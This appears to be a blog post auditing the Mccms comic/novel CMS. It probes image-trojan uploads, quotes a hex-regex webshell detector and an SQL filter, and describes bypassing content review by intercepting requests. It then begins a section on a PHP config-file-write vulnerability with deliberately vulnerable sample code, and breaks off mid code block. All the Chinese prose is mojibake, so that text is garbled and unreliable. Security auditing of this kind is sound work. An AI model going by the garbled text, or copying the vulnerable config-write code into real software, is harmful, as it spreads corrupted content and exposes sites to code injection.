åˆ†æ-æ¼æ´åˆ©ç”¨-1" class="headerlink" title="ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨"></a>ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">çŒœæµ‹</span><br><span class="line">1.å‘å¸ƒæœ¨é©¬æ–‡ä»¶ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">2.ä¸€äº›å®¢æˆ·ç«¯å¯ä»¥ä¿®æ”¹çš„å‚æ•°ï¼Œè¢«å‘½ä»¤æ‰§è¡Œå‡½æ•°åŒ…å«ä¸”æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>ä½†æ ¹æ®çš„<code>2.5.8</code>æ›´æ–°æ–‡æ¡£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Mccms</span>æ¼«ç”»å°è¯´ç³»ç»Ÿ-v2.<span class="number">5</span>.<span class="number">8</span>æ›´æ–°è¯¦æƒ…</span><br><span class="line"><span class="attribute">1</span>.ä¿®å¤äº†SQLæ³¨å…¥é«˜å±æ¼æ´</span><br><span class="line"><span class="attribute">2</span>.ä¿®å¤äº†æœ¨é©¬ä¼ªè£…å›¾ç‰‡ä¸Šä¼ æ¼æ´</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¦‚æœé€šè¿‡æ¼«ç”»å›¾ç‰‡ä¸Šä¼ æœ¨é©¬ï¼Œå¤§æ¦‚ç‡æ˜¯è¡Œä¸é€šäº†</p><p>å…ˆæ³¨å†Œå®Œä¿¡æ¯ï¼Œå†åå°å®Œæˆä½œè€…è®¤è¯</p><p><img src="/2022/11/22/CMS-Test/image-20221122151951892.png" alt="image-20221122151951892"></p><p><img src="/2022/11/22/CMS-Test/image-20221122152043515.png" alt="image-20221122152043515"></p><h5 id="æ¼«ç”»"><a href="#æ¼«ç”»" class="headerlink" title="æ¼«ç”»"></a>æ¼«ç”»</h5><p>ä½†æ˜¯ä¹Ÿå¯ä»¥è¯•è¯•ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œçœ‹çœ‹å®ƒæ€ä¹ˆä¿®å¤çš„</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œé™åˆ¶äº†æ–‡ä»¶ç±»å‹ï¼Œå¯ä»¥è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡</span><br></pre></td></tr></table></figure><p><img src="/2022/11/22/CMS-Test/image-20221122152444788.png" alt="image-20221122152444788"></p><p>ç›´æ¥ä¸Šä¼ è„šæœ¬æ–‡ä»¶ä¼šè¢«æ‹¦æˆª</p><p><img src="/2022/11/22/CMS-Test/image-20221122153207506.png" alt="image-20221122153207506"></p><p>ä¸Šä¼ å›¾ç‰‡ğŸçš„è¯ ï¼Œä¼šæ˜¾ç¤ºéæ³•å›¾ç‰‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Chapter.php</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">do_upload</span>(<span class="string">&#x27;image&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">display_errors</span>();</span><br><span class="line">            <span class="title function_ invoke__">get_json</span>(<span class="variable">$msg</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">data</span>();</span><br><span class="line">            <span class="variable">$img_path_file</span> = <span class="variable">$arr</span>[<span class="string">&#x27;full_path&#x27;</span>];</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">checkPicHex</span>(<span class="variable">$img_path_file</span>);</span><br><span class="line">           <span class="comment">/*å…³é”®åœ¨è¿™é‡Œï¼Œè®©å¯¹æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡çš„å†…å®¹è¿›è¡Œäº†æ£€æŸ¥å¯¼è‡´æ— æ³•ä¸Šä¼ */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> == <span class="number">1</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;éæ³•å›¾ç‰‡&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//æ£€æŸ¥ä¸Šä¼ å›¾ç‰‡æ˜¯å¦åŒ…å«æœ¨é©¬</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPicHex</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$resource</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        <span class="variable">$fileSize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="number">0</span>);<span class="comment">//æŠŠæ–‡ä»¶æŒ‡é’ˆç§»åˆ°æ–‡ä»¶çš„å¼€å¤´</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fileSize</span> &gt; <span class="number">512</span>)&#123; <span class="comment">// è‹¥æ–‡ä»¶å¤§äº521Bæ–‡ä»¶å–å¤´å’Œå°¾</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*fread â€”äºŒè¿›åˆ¶å®‰å…¨æ–‡ä»¶è¯»å–*/</span></span><br><span class="line">            <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span> - <span class="number">512</span>);<span class="comment">//æŠŠæ–‡ä»¶æŒ‡é’ˆç§»åˆ°æ–‡ä»¶å°¾éƒ¨</span></span><br><span class="line">            <span class="variable">$hexCode</span> .= <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>,<span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*bin2hex â€”å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤º*/</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// å–å…¨éƒ¨</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$resource</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(3c25.*?28.*?29.*?253e)|(3c3f.*?28.*?29.*?3f3e)|(3C534352495054)|(2F5343524950543E)|(3C736372697074)|(2F7363726970743E)/is&quot;</span>,<span class="variable">$hexCode</span>))</span><br><span class="line">        <span class="comment">/*åŒ¹é…16è¿›åˆ¶ä¸­ä¸€å¥è¯æœ¨é©¬ä¸­ç‰¹å¾ç¼–ç </span></span><br><span class="line"><span class="comment">        è¿‡æ»¤</span></span><br><span class="line"><span class="comment">        &lt;%()%&gt;</span></span><br><span class="line"><span class="comment">        &lt;?()?&gt;</span></span><br><span class="line"><span class="comment">        &lt;script&gt;()&lt;/script&gt;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*ä¹Ÿå°±æ˜¯æŠŠå›¾ç‰‡ä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»å–çš„æ•°æ®å†è¿›è¡Œåå…­è¿›åˆ¶è½¬åŒ–ï¼Œæœ€åè¿›è¡Œæ­£åˆ™åŒ¹é…è¿‡æ»¤ï¼Œçœ‹æ¥ç»•è¿‡ç¡®å®ä¸å®¹æ˜“*/</span></span><br></pre></td></tr></table></figure><p>æ­£å¸¸ä¸Šä¼ å›¾ç‰‡ï¼Œ</p><p><img src="/2022/11/22/CMS-Test/image-20221122152819257.png" alt="image-20221122152819257"></p><p>æˆåŠŸ</p><p><img src="/2022/11/22/CMS-Test/image-20221122154113084.png" alt="image-20221122154113084"></p><p>è€Œä¸”è¿˜å›æ˜¾äº†å›¾ç‰‡ä¸Šä¼ çš„è·¯å¾„</p><p>è¯•è¯•èƒ½ä¸èƒ½è®¿é—®</p><p><img src="/2022/11/22/CMS-Test/image-20221122162549084.png" alt="image-20221122162549084"></p><p>å‘ç°æ˜¯å¯ä»¥è®¿é—®è¿™ä¸ªç›®å½•ä¸‹çš„å›¾ç‰‡æ–‡ä»¶çš„</p><p>ä½†å½“æˆ‘åœ¨è¿™ä¸ªè·¯å¾„ç›®å½•ç›´æ¥æ”¾äº†è„šæœ¬æ–‡ä»¶ï¼Œå†è®¿é—®æ—¶</p><p><img src="/2022/11/22/CMS-Test/image-20221122165943218.png" alt="image-20221122165943218"></p><p>å‘ç°è¢«é˜»æ­¢äº†ï¼Œä¹Ÿå°±æ˜¯<code>apchae</code>åœ¨è¿™ä¸ª<strong>å›¾ç‰‡å­˜å‚¨ç›®å½•è®¾ç½®äº†è„šæœ¬æ–‡ä»¶çš„è®¿é—®æƒé™ç¦æ­¢ï¼Œé‚£ä¹ˆå°±æ— æ³•åˆ©ç”¨åœ¨è¿™ä¸ªç›®å½•ä¸‹çš„è„šæœ¬æ–‡ä»¶</strong></p><p>æ‰€ä»¥ï¼Œè¦ä¹ˆä¿®æ”¹ä¸Šä¼ çš„è·¯å¾„ï¼Œæ¯”å¦‚åˆ°ç½‘ç«™çš„è‡ªèº«è„šæœ¬ç›®å½•ä¸‹ï¼Œè¿›è¡Œè®¿é—®æ‰§è¡Œ</p><hr><h5 id="å°è¯´"><a href="#å°è¯´" class="headerlink" title="å°è¯´"></a>å°è¯´</h5><p>æŠ“åŒ…å°è¯´ï¼Œå‘ç°ç»•è¿‡äº†å­—æ•°è¿‡å°‘çš„é™åˆ¶ï¼Œè€Œä¸”ä¹Ÿç»•è¿‡äº†å°è¯´åå°å®¡æ ¸</p><p><img src="/2022/11/22/CMS-Test/image-20221122222054711.png" alt="image-20221122222054711"></p><p>æˆ‘ä»¬æŠ“åŒ…ä¿®æ”¹çš„å†…å®¹æ²¡æœ‰ç»è¿‡åå°ç›´æ¥åˆ°äº†å­˜å‚¨ç›®å½•</p><p><img src="/2022/11/22/CMS-Test/image-20221122222413963.png" alt="image-20221122222413963"></p><p>åé¢å‘ç°æ˜¯ç”±äºæºç ä¸­ï¼Œå¯¹ç­¾çº¦ç”¨æˆ·è‡ªåŠ¨å®¡æ ¸é€šè¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">            <span class="comment">//åˆ¤æ–­ç­¾çº¦ï¼Œç­¾çº¦ç”¨æˆ·è‡ªåŠ¨å®¡æ ¸</span></span><br><span class="line">            <span class="variable">$signing</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;signing&#x27;</span>,<span class="variable">$uid</span>);</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;yid&#x27;</span>] = <span class="variable">$signing</span> == <span class="number">1</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;bid&#x27;</span>] = <span class="variable">$bid</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸»è¦å¯¹åŠ¨æ¼«å’Œå°è¯´åå­—ï¼Œä»¥åŠè¯„è®ºå¤„è¿˜è¿›è¡Œäº†<code>sql</code>æ³¨å…¥é™åˆ¶</p><p><img src="/2022/11/22/CMS-Test/image-20221123201716429.png" alt="image-20221123201716429"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQLè¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯¹ä¸€å®šæ—¶é—´å†…æ›´æ–°æ•°ä¹Ÿæœ‰é™åˆ¶ï¼Œæ‰€ä»¥å¦‚æœæƒ³åˆ©ç”¨ç­¾çº¦ä½œè€…è´¦å·çˆ†åº“è¿˜æ˜¯æœ‰ç‚¹éš¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php   </span></span><br><span class="line">           <span class="comment">//åˆ¤æ–­äº”åˆ†é’Ÿå†…æ›´æ–°æ•°é‡</span></span><br><span class="line">           <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>()-<span class="number">300</span>;</span><br><span class="line">           <span class="variable">$mnum</span> = <span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_nums</span>(<span class="variable">$table</span>,<span class="keyword">array</span>(<span class="string">&#x27;bid&#x27;</span>=&gt;<span class="variable">$bid</span>,<span class="string">&#x27;addtime&gt;&#x27;</span>=&gt;<span class="variable">$time</span>));</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$mnum</span> &gt; <span class="number">5</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;ç³»ç»Ÿæ£€æµ‹åˆ°ä½ æœ‰éæ³•æš´åº“è¡Œä¸º~ï¼&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2022/11/22/CMS-Test/image-20221123123229249.png" alt="image-20221123123229249"></p><p>ä½†æ˜¯å…¶å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œéƒ½é»˜è®¤ä¸º<code>txt</code>æ–‡ä»¶</p><p>è€Œä¸”å¯¹ç±»ä¼¼<code>&lt;&gt;</code>ç‰¹æ®Šç¬¦å·ä¹Ÿè¿›è¡Œäº†ç¼–è¯‘</p><p><img src="/2022/11/22/CMS-Test/image-20221124133546733.png" alt="image-20221124133546733"></p><p><img src="/2022/11/22/CMS-Test/image-20221124133558480.png" alt="image-20221124133558480"></p><p>ç¨å¾®çœ‹çœ‹å°è¯´æ–‡æœ¬æ–‡ä»¶ç”Ÿæˆçš„ä»£ç æµç¨‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">        <span class="comment">//å†™å…¥å°è¯´åˆ°TXTæ–‡æœ¬</span></span><br><span class="line">        <span class="title function_ invoke__">get_book_txt</span>(<span class="variable">$bid</span>,<span class="variable">$id</span>,<span class="variable">$text</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;æ­å–œæ‚¨ï¼Œæ“ä½œæˆåŠŸ~!&#x27;</span>;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">get_url</span>(<span class="string">&#x27;author/bookchapter/index/&#x27;</span>.<span class="variable">$bid</span>);</span><br><span class="line">        <span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">/*è¿™æ˜¯æŠŠä½œè€…æ–‡ç« å†™å…¥å­˜å‚¨ç›®å½•çš„ä»£ç */</span></span><br></pre></td></tr></table></figure><p>è·Ÿè¿› <code>get_book_txt</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//è·å–å°è¯´txtæ–‡æœ¬</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_book_txt</span>(<span class="params"><span class="variable">$bid</span>,<span class="variable">$zid</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$txt_file</span> = FCPATH.<span class="string">&#x27;caches/txt/&#x27;</span>.<span class="variable">$bid</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$zid</span>.Mc_Book_Key).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="comment">/*è¿™é‡Œä¿®æ”¹äº†æ–‡æœ¬åå­—*/</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$text</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">write_file</span>(<span class="variable">$txt_file</span>, <span class="variable">$text</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$txt_file</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/*è¿™é‡Œå°±æ˜¯å¯¹æ”¹æ–‡ç« æ˜¯å¦é‡å¤çš„åˆ¤æ–­*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt_file</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†è·Ÿè¿›<code>write_file</code>å‡½æ•°</p><p>çœ‹çœ‹æˆ‘ä»¬çš„æ–‡æœ¬æ˜¯æ€ä¹ˆå†™å…¥æ–‡ä»¶çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å†™æ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_file</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span>, <span class="variable">$mode</span> = FOPEN_WRITE_CREATE_DESTRUCTIVE</span>)</span>&#123;</span><br><span class="line"><span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) <span class="title function_ invoke__">mkdirss</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="variable">$mode</span>)) <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸæ¥æ˜¯ç›´æ¥ç”¨<code>fwrite</code>å†™å…¥æ–‡ä»¶ï¼Œè€Œå­—ç¬¦å¼€å§‹å°±è¢«<code>html</code>è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å†™å…¥çš„ç»“æœè‚¯å®šæ˜¯è½¬ä¹‰åçš„ç»“æœ</p><h4 id="çŒœæµ‹"><a href="#çŒœæµ‹" class="headerlink" title="çŒœæµ‹"></a>çŒœæµ‹</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½æ˜¯å­˜åœ¨å‚æ•°å˜é‡å¯ä»¥è¢«ä»£ç æ‰§è¡Œå‡½æ•°è¦†ç›–ï¼Œå†é€šè¿‡ä¸å…¶ä»–å‚æ•°ç»“åˆï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å®Œæˆ</p><h1 id="PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´"><a href="#PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´" class="headerlink" title="PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´"></a>PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´</h1><p>åœ¨ä¸€ä¸ªæ¯”èµ›ä¸­äº†è§£åˆ°çš„ä¸€ä¸ªæ¼æ´ï¼Œå…³é”®åœ¨äºç»•è¿‡å‡½æ•°ä»è€ŒåŒ…å«</p><p><a href="https://bbs.zkaq.cn/t/6045.html">è½¬è½½æ–‡ç« </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p><code>config.php</code> çš„å†…å®¹å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span 